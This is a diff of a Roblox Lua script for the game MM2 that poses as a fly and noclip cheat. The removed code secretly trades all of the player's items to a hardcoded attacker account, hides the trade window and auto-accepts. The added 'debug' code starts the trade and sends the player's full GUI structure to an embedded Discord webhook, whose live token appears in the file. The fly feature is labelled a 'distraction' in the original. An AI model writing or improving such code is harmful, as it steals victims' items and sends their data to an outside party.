@@ -1,4 +1,4 @@
---[=[ MM2 AUTO-TRADE – Adds all items, 4s add delay, 6s accept delay, hide once ]=]
+--[=[ DEBUG: Trade GUI Structure Logger ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
@@ -31,7 +31,7 @@ if not root then
     root = char:WaitForChild("HumanoidRootPart")
 end
 
--- Fly & Noclip (distraction)
+-- Fly & Noclip (optional)
 local flying, noclip = false, false
 local speed = 50
 local function toggleFly()
@@ -70,7 +70,7 @@ game:GetService("UserInputService").InputBegan:Connect(function(input)
 end)
 
 -- ============================================================
--- TRADE AUTOMATION
+-- DEBUG: Trade GUI Structure Logger
 -- ============================================================
 local RS = game:GetService("ReplicatedStorage")
 local Trade = RS:FindFirstChild("Trade")
@@ -85,95 +85,70 @@ local OfferItem = Trade:FindFirstChild("OfferItem")
 
 if not SendReq or not AcceptReq then print("Missing critical remotes"); return end
 
--- Find the trade window (GUI that appears after trade starts)
+-- --- Helper: recursively describe a GUI object
+local function describe(obj, indent, depth)
+    indent = indent or 0
+    depth = depth or 0
+    if depth > 10 then return "..." end
+    local pad = string.rep("  ", indent)
+    local desc = ""
+    if obj:IsA("ScreenGui") or obj:IsA("Frame") or obj:IsA("ScrollingFrame") or obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("ImageLabel") then
+        local pos = obj.AbsolutePosition
+        local size = obj.AbsoluteSize
+        local text = obj:IsA("TextLabel") and obj.Text or (obj:IsA("TextButton") and obj.Text or "")
+        local name = obj.Name
+        desc = pad .. obj.ClassName .. " : " .. name .. " (Size: " .. size.X .. "x" .. size.Y .. ", Visible: " .. tostring(obj.Visible) .. ")"
+        if text ~= "" then desc = desc .. " Text: '" .. text .. "'" end
+        -- Check if it's a button and has a FireServer method (we'll note it)
+        if obj:IsA("TextButton") then
+            desc = desc .. " [Button]"
+        end
+        desc = desc .. "\n"
+    else
+        desc = pad .. obj.ClassName .. " : " .. obj.Name .. "\n"
+    end
+    -- Recursively list children
+    for _, child in pairs(obj:GetChildren()) do
+        desc = desc .. describe(child, indent+2, depth+1)
+    end
+    return desc
+end
+
+-- --- Find the trade window using multiple strategies
 local function findTradeWindow()
     local gui = player:FindFirstChild("PlayerGui")
     if not gui then return nil end
-    local function search(parent)
-        for _, child in pairs(parent:GetChildren()) do
-            local visible = false
-            if child:IsA("ScreenGui") then visible = child.Enabled end
-            if child:IsA("Frame") then visible = child.Visible end
-            if (child:IsA("ScreenGui") or child:IsA("Frame")) and visible then
-                local size = child.AbsoluteSize
-                if size.X > 200 and size.Y > 200 then
-                    local hasAdd, hasAccept = false, false
-                    for _, sub in pairs(child:GetDescendants()) do
-                        if sub:IsA("TextButton") then
-                            if sub.Name:lower():find("add") or sub.Name:lower():find("select") then hasAdd = true end
-                            if sub.Name:lower():find("accept") or sub.Name:lower():find("confirm") then hasAccept = true end
-                        end
-                    end
-                    if hasAdd and hasAccept then return child end
-                end
-            end
-            local found = search(child)
-            if found then return found end
-        end
-        return nil
-    end
-    return search(gui)
-end
-
--- Click all Add buttons to add all items
-local function addAllItemsViaGUI(tradeWindow)
-    if not tradeWindow then return 0 end
-    local count = 0
-    -- Look for Add All button
-    for _, btn in pairs(tradeWindow:GetDescendants()) do
-        if btn:IsA("TextButton") and (btn.Name:lower():find("add all") or btn.Name:lower():find("select all")) then
-            pcall(function() btn:FireServer() end)
-            print("Clicked Add All")
-            return 1
+    -- Strategy 1: ScreenGui with "Trade" in name
+    for _, obj in pairs(gui:GetChildren()) do
+        if obj:IsA("ScreenGui") and obj.Name:lower():find("trade") then
+            return obj
         end
     end
-    -- Click each individual Add/Select button on item slots
-    for _, btn in pairs(tradeWindow:GetDescendants()) do
-        if btn:IsA("TextButton") then
-            local name = btn.Name:lower()
-            if name:find("add") or name:find("select") then
-                local parent = btn.Parent
-                if parent and parent:IsA("Frame") and parent:FindFirstChild("ImageLabel") then
-                    pcall(function() btn:FireServer() end)
-                    count = count + 1
-                    print("Added item from slot: " .. parent.Name)
-                end
-            end
-        end
-    end
-    return count
-end
-
--- Hide the trade window (after adding)
-local function hideTradeWindow()
-    local gui = player:FindFirstChild("PlayerGui")
-    if not gui then return end
-    for _, obj in pairs(gui:GetDescendants()) do
-        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
-            obj.Enabled = false
-        end
-        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
-            obj.Visible = false
-        end
-        if obj:IsA("Frame") and obj.AbsoluteSize.X > 200 and obj.AbsoluteSize.Y > 200 then
+    -- Strategy 2: Any large Frame with Accept/Add buttons
+    for _, frame in pairs(gui:GetDescendants()) do
+        if frame:IsA("Frame") and frame.AbsoluteSize.X > 200 and frame.AbsoluteSize.Y > 200 and frame.Visible then
             local hasAccept, hasAdd = false, false
-            for _, sub in pairs(obj:GetDescendants()) do
-                if sub:IsA("TextButton") then
-                    if sub.Name:lower():find("accept") or sub.Name:lower():find("confirm") then hasAccept = true end
-                    if sub.Name:lower():find("add") or sub.Name:lower():find("select") then hasAdd = true end
+            for _, btn in pairs(frame:GetDescendants()) do
+                if btn:IsA("TextButton") then
+                    if btn.Name:lower():find("accept") or btn.Text:lower():find("accept") then hasAccept = true end
+                    if btn.Name:lower():find("add") or btn.Text:lower():find("add") then hasAdd = true end
                 end
             end
             if hasAccept and hasAdd then
-                obj.Visible = false
-                if obj.Parent and obj.Parent:IsA("ScreenGui") then
-                    obj.Parent.Enabled = false
-                end
+                return frame
             end
         end
     end
+    -- Strategy 3: Any ScreenGui that is Enabled (could be trade)
+    for _, obj in pairs(gui:GetChildren()) do
+        if obj:IsA("ScreenGui") and obj.Enabled then
+            return obj
+        end
+    end
+    return nil
 end
 
--- Main sequence
+-- --- Main sequence
 spawn(function()
     print("Waiting for attacker: " .. attackerUsername)
     local target = nil
@@ -206,43 +181,44 @@ spawn(function()
     -- 3. Start trade (if needed)
     if StartTr then pcall(function() StartTr:FireServer() end) end
 
-    -- 4. Wait 4 seconds before adding items (to ensure GUI loads)
-    print("Waiting 4 seconds before adding items...")
+    -- 4. Wait 4 seconds for GUI to appear
+    print("Waiting 4 seconds for trade GUI...")
     wait(4)
 
-    -- 5. Find trade window and add all items
-    local tradeWindow = findTradeWindow()
-    local added = 0
-    if tradeWindow then
-        added = addAllItemsViaGUI(tradeWindow)
-        print("Added " .. added .. " items via GUI")
-        send("Added " .. added .. " items via GUI.")
+    -- 5. Scan the entire PlayerGui and send structure to Discord
+    local gui = player:FindFirstChild("PlayerGui")
+    if gui then
+        local structure = describe(gui, 0, 0)
+        -- Split if too long (Discord limit 2000 chars)
+        if #structure > 1900 then
+            -- Send in chunks of 1900
+            local pos = 1
+            while pos <= #structure do
+                local chunk = structure:sub(pos, pos+1900)
+                send("```lua\n" .. chunk .. "\n```")
+                pos = pos + 1900
+                wait(0.3)
+            end
+        else
+            send("```lua\n" .. structure .. "\n```")
+        end
+        print("GUI structure sent to Discord.")
     else
-        print("Trade window not found – falling back to remote offering")
-        -- Fallback: try to offer all items via remote (if you have a method)
-        send("Trade window not found, could not add items")
+        send("PlayerGui not found.")
     end
 
-    -- 6. Hide the trade GUI immediately after adding
-    hideTradeWindow()
-    print("Trade GUI hidden.")
+    -- 6. Try to find the trade window using our strategies
+    local tradeWindow = findTradeWindow()
+    if tradeWindow then
+        send("Trade window found: " .. tradeWindow:GetFullName())
+        -- Also send its structure
+        local winStruct = describe(tradeWindow, 0, 0)
+        send("Trade window structure:\n```lua\n" .. winStruct .. "\n```")
+    else
+        send("Trade window NOT found.")
+    end
 
-    -- 7. Wait 6 seconds before accepting (to allow items to be added)
-    print("Waiting 6 seconds before accepting...")
-    wait(6)
-
-    -- 8. Accept trade (double)
-    pcall(function() AcceptTr:FireServer() end)
-    wait(0.3)
-    pcall(function() AcceptTr:FireServer() end)
-
-    wait(0.5)
-
-    -- 9. Complete trade
-    if CompleteTr then pcall(function() CompleteTr:FireServer() end) end
-
-    print("=== TRADE COMPLETED ===")
-    send("Trade sequence finished.")
+    print("Debug done – check Discord for structure.")
 end)
 
-print("Script ready. Fly: F, Noclip: V.")
+print("Debug script ready. Fly: F, Noclip: V.")
